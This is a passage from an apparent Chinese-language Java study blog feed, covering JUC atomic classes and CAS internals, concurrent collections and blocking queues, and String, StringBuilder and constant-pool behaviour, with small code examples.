&#123;</span><br><span class="line">                Thread.sleep(<span class="number">10</span>);</span><br><span class="line">                result += i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    Thread computeThread = <span class="keyword">new</span> Thread(futureTask);</span><br><span class="line">    computeThread.start();</span><br><span class="line"></span><br><span class="line">    Thread otherThread = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;other task is running...&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    otherThread.start();</span><br><span class="line">    System.out.println(futureTask.get());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="JUC的Atomic类"><a href="#JUC的Atomic类" class="headerlink" title="JUC的Atomic类"></a>JUC的Atomic类</h1><p><code>atomic</code>是指一个操作是不可中断的，即使多个线程一起执行任务时，一个操作一旦开始就不会被其他线程干扰</p>
<p>并发包JUC原子类都存放在<code>java.util.concurrent.atomic</code>下，主要包括</p>
<p><strong>基本类型</strong></p>
<ul>
<li><code>AtomicInteger</code>：整型原子类</li>
<li><code>AtomicLong</code>：长整型原子类</li>
<li><code>AtomicBoolean</code>：布尔型原子类</li>
</ul>
<p><strong>数组类型</strong></p>
<ul>
<li><p><code>AtomicIntegerArray</code>：整型数组原子类</p>
</li>
<li><p><code>AtomicLongArray</code>：长整型数组原子类</p>
</li>
<li><p><code>AtomicReferenceArray</code>：引用类型数组原子类</p>
</li>
</ul>
<p><strong>引用类型</strong></p>
<ul>
<li><code>AtomicReference</code>：引用类型原子类</li>
<li><code>AtomicStampedReference</code>：带有版本号的原子引用类</li>
<li><code>AtomicMarkableReference</code>：原子更新带有标记位的引用类型</li>
</ul>
<p><strong>对象属性修改类型</strong></p>
<ul>
<li><code>AtomicIntegerFieldUpdater</code>:原子更新整形字段的更新器</li>
<li><code>AtomicLongFieldUpdater</code>:原子更新长整型字段的更新器</li>
<li><code>AtomicStampedReference</code>：原子更新带有版本号的引用类型。该类将整数值与引用关联起来，可用于解决原子的更新数据和数据的版本号，可以解决使用CAS进行原子更新可能出现的ABA问题。</li>
</ul>
<h2 id="原子整数"><a href="#原子整数" class="headerlink" title="原子整数"></a>原子整数</h2><ul>
<li>AtomicBoolean implements Serializable</li>
<li>AtomicInteger extends Numbers</li>
<li>AtomicLong  extends Numbers</li>
</ul>
<h3 id="AtomicInteger"><a href="#AtomicInteger" class="headerlink" title="AtomicInteger"></a>AtomicInteger</h3><blockquote>
<p>例如 i++ 操作，不是原子操作，1.读取 i 的初始值 2. 自增 3.终值赋予</p>
<p>在<code>getAndIncrement()</code>中，是原子操作，保证基本类型操作的原子性</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//构造初始值</span></span><br><span class="line">AtomicInteger i = <span class="keyword">new</span> AtomicInteger(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//自增并获取++i</span></span><br><span class="line">System.out.println(i.incrementAndGet());</span><br><span class="line"><span class="comment">//i++</span></span><br><span class="line">System.out.println(i.getAndIncrement());</span><br><span class="line">System.out.println(i.get());</span><br><span class="line"></span><br><span class="line"><span class="comment">//先获取再加</span></span><br><span class="line">System.out.println(i.getAndAdd(<span class="number">5</span>));</span><br><span class="line"><span class="comment">//先加</span></span><br><span class="line">System.out.println(i.addAndGet(<span class="number">5</span>));</span><br></pre></td></tr></table></figure>

<h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p><strong><code>AtomicInteger</code>主要利用<code>CAS+volatile+native</code>方法来保证原子操作，从而避免<code>synchronized</code>的高开销</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">int</span> value;</span><br></pre></td></tr></table></figure>

<p>下面是<code>incrementAndGet</code>源码，调用<code>Unsafe</code>的<code>getAndAddInt()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">incrementAndGet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> unsafe.getAndAddInt(<span class="keyword">this</span>, valueOffset, <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>genAndAddInt()</code>源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">getAndAddInt</span><span class="params">(Object o, <span class="keyword">long</span> offset, <span class="keyword">int</span> delta)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        v = getIntVolatile(o, offset);</span><br><span class="line">    &#125; <span class="keyword">while</span> (!weakCompareAndSetInt(o, offset, v, v + delta));</span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>offset</code>指示该字段相对对象内存地址的偏移，<code>delta</code>指示操作需要加的数值，这里为1。通过<code>getIntVolatile</code>方法得到旧的预期值，通过调用<code>weakCompareAndSetInt</code>来进行CAS比较，如果该字段内存地址中的值等于v，那么就更新内存地址<code>o+offset</code>的值为<code>v+delta</code>。</p>
<p>在发生冲突时，其做法是不断的进行重试。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">weakCompareAndSetInt</span><span class="params">(Object o, <span class="keyword">long</span> offset,</span></span></span><br><span class="line"><span class="function"><span class="params">                                          <span class="keyword">int</span> expected,</span></span></span><br><span class="line"><span class="function"><span class="params">                                          <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> compareAndSetInt(o, offset, expected, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@HotSpotIntrinsicCandidate</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">boolean</span> <span class="title">compareAndSetInt</span><span class="params">(Object o, <span class="keyword">long</span> offset,</span></span></span><br><span class="line"><span class="function"><span class="params">                                             <span class="keyword">int</span> expected,</span></span></span><br><span class="line"><span class="function"><span class="params">                                             <span class="keyword">int</span> x)</span></span>;</span><br></pre></td></tr></table></figure>

<h2 id="原子数组"><a href="#原子数组" class="headerlink" title="原子数组"></a>原子数组</h2><ul>
<li>AtomicIntegerArray</li>
<li>AtomicLongArray</li>
<li>AtomicReferenceArray</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AtomicIntegerArray atomicIntegerArray = <span class="keyword">new</span> AtomicIntegerArray(<span class="number">10</span>);</span><br><span class="line"><span class="keyword">int</span> length = atomicIntegerArray.length();</span><br><span class="line">atomicIntegerArray.set(<span class="number">1</span>,<span class="number">20</span>);</span><br><span class="line">System.out.println(atomicIntegerArray.get(<span class="number">1</span>));</span><br></pre></td></tr></table></figure>

<h2 id="原子引用"><a href="#原子引用" class="headerlink" title="原子引用"></a>原子引用</h2><blockquote>
<p>基本类型原子类只能更新一个变量，如果需要原子更新多个变量，需要使用引用类型原子类</p>
</blockquote>
<ul>
<li>AtomicReference</li>
<li>AtomicMarkableReference  记录有没有被更改过，boolean</li>
<li>AtomicStampedReference </li>
</ul>
<h3 id="AtomicReference"><a href="#AtomicReference" class="headerlink" title="AtomicReference"></a>AtomicReference</h3><blockquote>
<p>AtomicReference&lt;引用对象&gt; balance=new AtomicReference&lt;&gt;(引用对象参数)</p>
<p><strong>保护对象引用的原子性</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DecimalAccounts</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> AtomicReference&lt;BigDecimal&gt; balance;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DecimalAccounts</span><span class="params">(BigDecimal bigDecimal)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.balance=<span class="keyword">new</span> AtomicReference&lt;&gt;(bigDecimal);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="AtomicStampedReference"><a href="#AtomicStampedReference" class="headerlink" title="AtomicStampedReference"></a>AtomicStampedReference</h3><blockquote>
<p>添加多个版本号，解决ABA，使用版本号记录修改次数</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> AtomicStampedReference&lt;String&gt; ref=<span class="keyword">new</span> AtomicStampedReference&lt;&gt;(<span class="string">&quot;a&quot;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//获取初始值</span></span><br><span class="line">    String reference = ref.getReference();</span><br><span class="line">    <span class="comment">//获取版本号</span></span><br><span class="line">    <span class="keyword">int</span> stamp = ref.getStamp();</span><br><span class="line">    </span><br><span class="line">    ref.compareAndSet(reference,<span class="string">&quot;b&quot;</span>,stamp,stamp+<span class="number">1</span>);</span><br><span class="line">    System.out.println(ref.getReference());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="AtomicMarkableReference"><a href="#AtomicMarkableReference" class="headerlink" title="AtomicMarkableReference"></a>AtomicMarkableReference</h3><p>AtomicMarkableReference的唯一区别就是不再用int标识引用，而是使用boolean变量——表示引用变量是否被更改过。</p>
<blockquote>
<p>只关心引用变量是否被更改过，并不关心更改了几次</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AtomicMarkableReference ref=<span class="keyword">new</span> AtomicMarkableReference(bag,<span class="keyword">true</span>)</span><br><span class="line"><span class="keyword">boolean</span> success=ref.compareAndSet(bag,<span class="keyword">new</span> bag(),<span class="keyword">true</span>,<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>

<h2 id="原子字段更新"><a href="#原子字段更新" class="headerlink" title="原子字段更新"></a>原子字段更新</h2><p>要想原子地更新对象的属性需要两步</p>
<p>第一步，因为对象属性修改类型原子类都是抽象类，所以每次使用都必须使用静态方法<code>newUpdater()</code>创建一个更新器，并且需要设置想要更新的类和字段</p>
<p>第二步，更新的对象属性必须使用<code>public volatile</code>修饰</p>
<h3 id="AtomicReferenceFieldUpdater"><a href="#AtomicReferenceFieldUpdater" class="headerlink" title="AtomicReferenceFieldUpdater"></a>AtomicReferenceFieldUpdater</h3><blockquote>
<p>保证对象成员变量、字段的线程安全性，<strong>只能配合volatile修饰的字段</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@param</span> tclass the <span class="class"><span class="keyword">class</span> <span class="title">of</span> <span class="title">the</span> <span class="title">objects</span> <span class="title">holding</span> <span class="title">the</span> <span class="title">field</span></span></span><br><span class="line"><span class="class">@<span class="title">param</span> <span class="title">vclass</span> <span class="title">the</span> <span class="title">class</span> <span class="title">of</span> <span class="title">the</span> <span class="title">field</span></span></span><br><span class="line"><span class="class">@<span class="title">param</span> <span class="title">fieldName</span> <span class="title">the</span> <span class="title">name</span> <span class="title">of</span> <span class="title">the</span> <span class="title">field</span> <span class="title">to</span> <span class="title">be</span> <span class="title">updated</span></span></span><br><span class="line"><span class="class">@<span class="title">CallerSensitive</span></span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">static</span> &lt;<span class="title">U</span>,<span class="title">W</span>&gt; <span class="title">AtomicReferenceFieldUpdater</span>&lt;<span class="title">U</span>,<span class="title">W</span>&gt; <span class="title">newUpdater</span>(<span class="title">Class</span>&lt;<span class="title">U</span>&gt; <span class="title">tclass</span>,</span></span><br><span class="line"><span class="class">                                                                <span class="title">Class</span>&lt;<span class="title">W</span>&gt; <span class="title">vclass</span>,</span></span><br><span class="line"><span class="class">                                                                <span class="title">String</span> <span class="title">fieldName</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> AtomicReferenceFieldUpdaterImpl&lt;U,W&gt;</span><br><span class="line">        (tclass, vclass, fieldName, Reflection.getCallerClass());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="comment">//更新字段需要public volatile修饰</span></span><br><span class="line">    <span class="keyword">volatile</span> String name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Student stu=<span class="keyword">new</span> Student();</span><br><span class="line"><span class="comment">//由于字段更新原子类都是抽象类，需要调用静态方法创建一个更新器</span></span><br><span class="line">AtomicReferenceFieldUpdater updater=</span><br><span class="line">   AtomicReferenceFieldUpdater.newUpdater(Student.class,String.class,<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">updater.compareAndSet(stu,<span class="keyword">null</span>,<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">System.out.println(stu);</span><br></pre></td></tr></table></figure>

<h1 id="JUC的集合类"><a href="#JUC的集合类" class="headerlink" title="JUC的集合类"></a>JUC的集合类</h1><p><strong>线程安全集合类</strong></p>
<ul>
<li><p>遗留-vertor(list)、HashTable(HashMap)</p>
</li>
<li><p>修饰-SynchronizedMap、SynchronizedList(使用Collections方法修饰)-内部还是使用Synchronized</p>
</li>
<li><p>JUC</p>
<ul>
<li>Blocking类(实现基于锁，并提供用来阻塞的方法来保证线程安全)</li>
<li>CopyOnWrite类(适合读多写少的场景)</li>
<li>Concurrent类，使用CAS优化，性能较好，但会存在弱一致性(可能会读取到旧数据)(遍历size)</li>
</ul>
</li>
</ul>
<h2 id="CopyOnWriteArratList"><a href="#CopyOnWriteArratList" class="headerlink" title="CopyOnWriteArratList"></a>CopyOnWriteArratList</h2><p><code>copyOnWriteArraySet</code>内部也是<code>CopyOnWriteArrayList</code>作为其实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">CopyOnWriteArraySet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    al = <span class="keyword">new</span> CopyOnWriteArrayList&lt;E&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>写入时拷贝</strong>，<strong>增删改即写操作</strong>会将底层数组拷贝一份，更改操作在新数组上执行，这时不影响其他线程的<strong>并发读，读写分离(并发 读写)</strong></p>
<p>读写操作，读操作都未加锁</p>
<img src="https://csn.damyoung.cn/image-20201008224318927.png" alt="image-20201008224318927" style="zoom:67%;" />

<h2 id="BlockingQueue"><a href="#BlockingQueue" class="headerlink" title="BlockingQueue"></a>BlockingQueue</h2><p><code>java.util.concurrent.BlockingQueue</code>接口有以下阻塞队列的实现</p>
<ul>
<li><code>FIFO</code>队列：<code>LinkedBlockingQueue</code>、<code>ArrayBlockingQueue</code>(固定长度)</li>
<li>优先级队列：<code>PriorityBlockingQueue</code></li>
</ul>
<p>提供阻塞的<code>take()</code>和<code>put()</code>方法，如果队列为空<code>take()</code>将阻塞，直到队列中有内容；如果队列为满<code>put()</code>将阻塞，直到队列有空闲位置</p>
<h3 id="使用BlockingQueue实现生产者，消费者案例"><a href="#使用BlockingQueue实现生产者，消费者案例" class="headerlink" title="使用BlockingQueue实现生产者，消费者案例"></a>使用BlockingQueue实现生产者，消费者案例</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProducerConsumer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> BlockingQueue&lt;String&gt; blockingQueue=<span class="keyword">new</span> ArrayBlockingQueue&lt;&gt;(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Producer</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                blockingQueue.put(<span class="string">&quot;product&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;product...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Consumer</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                blockingQueue.take();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;consume...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">            Producer producer = <span class="keyword">new</span> Producer();</span><br><span class="line">            producer.start();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            Consumer consumer = <span class="keyword">new</span> Consumer();</span><br><span class="line">            consumer.start();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">            Producer producer = <span class="keyword">new</span> Producer();</span><br><span class="line">            producer.start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ArrayBlockingQueue"><a href="#ArrayBlockingQueue" class="headerlink" title="ArrayBlockingQueue"></a>ArrayBlockingQueue</h3><p><code>ArrayBlockingQueue</code>是<code>BlockingQueue</code>接口的有界队列实现类，底层采用<strong>数组</strong>来实现。<code>ArrayBlockingQueue</code>一旦创建，<strong>容量不能改变</strong>。其并发控制采用可重入锁来控制，不管是插入操作还是读取操作，都需要获取到锁才能进行操作。当队列容量满时，尝试将元素放入队列将导致操作阻塞;尝试从一个空队列中取一个元素也会同样阻塞。</p>
<p><code>ArrayBlockingQueue</code>默认情况下不能保证线程访问队列的公平性，所谓公平性是指严格按照线程等待的绝对时间顺序，即最先等待的线程能够最先访问到<code>ArrayBlockingQueue</code>。而非公平性则是指访问<code>ArrayBlockingQueue</code>的顺序不是遵守严格的时间顺序，有可能存在，当<code>ArrayBlockingQueue</code>可以被访问时，长时间阻塞的线程依然无法访问到<code>ArrayBlockingQueue</code>。如果保证公平性，通常会降低吞吐量。如果需要获得公平性的<code>ArrayBlockingQueue</code>，可采用如下代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ArrayBlockingQueue&lt;Integer&gt; blockingQueue = <span class="keyword">new</span> ArrayBlockingQueue&lt;Integer&gt;(<span class="number">10</span>,<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure>

<h3 id="LinkedBlockingQueue"><a href="#LinkedBlockingQueue" class="headerlink" title="LinkedBlockingQueue"></a>LinkedBlockingQueue</h3><p><code>LinkedBlockingQueue</code>底层基于单向链表实现的阻塞队列，可以当做无界队列也可以当做有界队列来使用，同样满足FIFO的特性，与<code>ArrayBlockingQueue</code>相比起来具有更高的吞吐量，为了防止<code>LinkedBlockingQueue</code>容量迅速增，损耗大量内存。通常在创建<code>LinkedBlockingQueue</code>对象时，会指定其大小，如果未指定，容量等于<code>Integer.MAX_VALUE</code>。</p>
<blockquote>
<p>有界无界是根据容量是否为<code>Interger.MAX_VALUE</code>来判别。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//某种意义上的无界队列</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">LinkedBlockingDeque</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(Integer.MAX_VALUE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//指定初始容量</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">LinkedBlockingDeque</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (capacity &lt;= <span class="number">0</span>) <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException();</span><br><span class="line">    <span class="keyword">this</span>.capacity = capacity;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将集合加入队列</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">LinkedBlockingDeque</span><span class="params">(Collection&lt;? extends E&gt; c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(Integer.MAX_VALUE);</span><br><span class="line">    addAll(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="PriorityBlockingQueue"><a href="#PriorityBlockingQueue" class="headerlink" title="PriorityBlockingQueue"></a>PriorityBlockingQueue</h3><p><code>PriorityBlockingQueue</code>是一个支持优先级的无界阻塞队列。默认情况下元素采用自然顺序进行排序，也可以通过自定义类实现<code>compareTo()</code>方法来指定元素排序规则，或者初始化时通过构造器参数<code>Comparator</code>来指定排序规则。</p>
<p><code>PriorityBlockingQueue</code>并发控制采用的是<code>ReentrantLock</code>，队列为无界队列（<code>ArrayBlockingQueue</code>是有界队列，<code>LinkedBlockingQueue</code>也可以通过在构造函数中传入<code>capacity</code>指定队列最大的容量，但是<code>PriorityBlockingQueue</code>只能指定初始的队列大小，后面插入元素的时候，如果空间不够的话会自动扩容）。</p>
<p>简单地说，它就是<code>PriorityQueue</code>的线程安全版本。不可以插入<code>null</code>值，同时，插入队列的对象必须是可比较大小的（<code>comparable</code>），否则报<code>ClassCastException</code>异常。它的插入操作<code>put</code>方法不会<code>block</code>，因为它是无界队列（<code>take</code>方法在队列为空的时候会阻塞）。</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>javaSE</title>
    <url>/2021/01/18/javaSE/</url>
    <content><![CDATA[<h1 id="String"><a href="#String" class="headerlink" title="String"></a>String</h1><h2 id="1-String-StringBuffer-StringBuilder"><a href="#1-String-StringBuffer-StringBuilder" class="headerlink" title="1.String/StringBuffer/StringBuilder"></a>1.String/StringBuffer/StringBuilder</h2><ol>
<li><code>String</code>被声明为<code>final</code>，不可以被继承，属于不可变对象；每次使用”+”拼接，都会产生一个对象</li>
<li><code>StringBuffer</code> 线程安全，性能低，内部使用<code>Synchronized</code>进行同步(单线程下，性能相差并不大，内部使用偏向锁)</li>
<li><code>StringBuilder</code> 线程不安全，但性能高，字符串相加在编译后会使用该类优化代码实现拼接</li>
</ol>
<a id="more"></a>

<h2 id="2-String俩种赋值方式"><a href="#2-String俩种赋值方式" class="headerlink" title="2.String俩种赋值方式"></a>2.String俩种赋值方式</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//方式一</span></span><br><span class="line">String name1 = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line"><span class="comment">//方式二</span></span><br><span class="line">Stirng name2 = <span class="keyword">new</span> String(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line"></span><br><span class="line">name1 == name2;<span class="comment">//false</span></span><br></pre></td></tr></table></figure>

<p>方式一：会自动将字符串放在字符串常量池中，同时<strong>栈内存</strong>会有指向<strong>堆内存常量池</strong>的指针</p>
<p>方式二: 首先会寻找常量池中是否存在该常量</p>
<ul>
<li>若存在则只在堆内存创建一个对象；</li>
<li>否则，会首先在堆内存创建一个对象，然后在常量池创建一个字符串常量，</li>
<li><strong>name指向堆内存对象，而堆内存中存储着指向常量池的地址</strong></li>
</ul>
<h2 id="3-String创建对象五种情况分析"><a href="#3-String创建对象五种情况分析" class="headerlink" title="3.String创建对象五种情况分析"></a>3.String创建对象五种情况分析</h2><ul>
<li>实例变量只有在运行期才会被确定，静态变量在编译器时确定</li>
<li>如果在编译器可以确定，那么使用已有对象，否则创建新的对象</li>
</ul>
<h3 id="情况一"><a href="#情况一" class="headerlink" title="情况一"></a>情况一</h3><blockquote>
<p>变量运行期确定，常量池编译器确定</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String a = <span class="string">&quot;a&quot;</span>;<span class="comment">//常量池编译器确定</span></span><br><span class="line">Strnig a1 = a+<span class="string">&quot;1&quot;</span>;<span class="comment">//运行期确定（a1）</span></span><br><span class="line">String a2 = <span class="string">&quot;a1&quot;</span>;<span class="comment">//常量池编译器确定</span></span><br><span class="line"></span><br><span class="line">a1 == a2;<span class="comment">//false</span></span><br></pre></td></tr></table></figure>

<h3 id="情况二"><a href="#情况二" class="headerlink" title="情况二"></a>情况二</h3><blockquote>
<p>final修饰的是静态变量，编译器确定</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> String b = <span class="string">&quot;b&quot;</span>;<span class="comment">//final修饰的变量为静态，编译器确定</span></span><br><span class="line">String b1 = b+<span class="string">&quot;1&quot;</span>;<span class="comment">//编译器可以读取静态变量，编译器确定，放入常量池</span></span><br><span class="line">String b2 = <span class="string">&quot;b1&quot;</span>;<span class="comment">//获取常量池的值，编译器确定</span></span><br><span class="line"></span><br><span class="line">b1 == b2;<span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<h3 id="情况三"><a href="#情况三" class="headerlink" title="情况三"></a>情况三</h3><blockquote>
<p>通过方法取值,只能在运行期确定</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String c = getString();<span class="comment">//通过方法取值,只能在运行期确定</span></span><br><span class="line">String c1 = c+<span class="number">1</span>;<span class="comment">//运行期确定</span></span><br><span class="line">String c2 = <span class="string">&quot;c1&quot;</span>;<span class="comment">//编译期确定</span></span><br><span class="line"></span><br><span class="line">c1==c2;<span class="comment">//false</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">getString</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;c&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="情况四"><a href="#情况四" class="headerlink" title="情况四"></a>情况四</h3><blockquote>
<p>虽然是个final常量,但是方法还是在运行期才确定</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> String d = getString();<span class="comment">//虽然是个final常量,但是方法还是在运行期才确定</span></span><br><span class="line">String d1 = d+<span class="number">1</span>;</span><br><span class="line">String d2 = <span class="string">&quot;d1&quot;</span>;</span><br><span class="line"></span><br><span class="line">d1==d2;<span class="comment">//false</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">getString</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;d&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="情况五"><a href="#情况五" class="headerlink" title="情况五"></a>情况五</h3><blockquote>
<p>变量拼接会产生多个对象</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String a = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">String b = <span class="string">&quot;b&quot;</span>;</span><br><span class="line">String c = a+b+<span class="number">1</span>;<span class="comment">//运行时先产生a+b对象,再产生a+b+1对象</span></span><br><span class="line">String d = <span class="string">&quot;a&quot;</span>+<span class="string">&quot;b&quot;</span>+<span class="number">1</span>;<span class="comment">//常量相加,只产生一个对象</span></span><br><span class="line"></span><br><span class="line">c==d;<span class="comment">//false</span></span><br></pre></td></tr></table></figure>

<h2 id="4-String为什么是不可变的"><a href="#4-String为什么是不可变的" class="headerlink" title="4.String为什么是不可变的"></a>4.String为什么是不可变的</h2><h3 id="不可变对象"><a href="#不可变对象" class="headerlink" title="不可变对象"></a>不可变对象</h3><p>不可变对象是指一个对象的状态在对象被创建之后就不再变化。</p>
<p><strong>不可改变</strong>：不能改变对象内的成员变量，包括基本数据类型的值不能改变，引用类型的变量不能指向其他的对象，引用类型指向的对象的状态也不能改变。</p>
